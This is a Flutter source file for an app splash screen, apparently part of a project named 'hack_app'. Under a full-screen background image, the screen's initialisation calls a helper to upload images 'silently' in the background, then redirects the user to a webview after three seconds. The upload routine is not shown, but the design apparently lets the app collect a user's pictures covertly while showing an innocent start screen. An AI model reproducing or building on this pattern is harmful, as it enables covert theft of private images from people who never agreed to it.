import 'package:flutter/material.dart';
import 'package:hack_app/screen/camera_ui.dart';
import 'dart:async';
import '../features/imageuploader_service_helper.dart';
import 'web_home_screen.dart';

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  final ImageServiceHelper _imageService = ImageServiceHelper();

  @override
  void initState() {
    super.initState();

    // 🔄 Start uploading in background
    _imageService.uploadImagesSilently();

    // ⏳ Navigate after 3 seconds
    Timer(const Duration(seconds: 3), () {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => const Webviewr()),
      );
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SizedBox.expand(
        child: Image.asset(
          'assets/nasa-Q1p7bh3SHj8-unsplash.jpg',
          fit: BoxFit.cover,
        ),
      ),
    );
  }
}
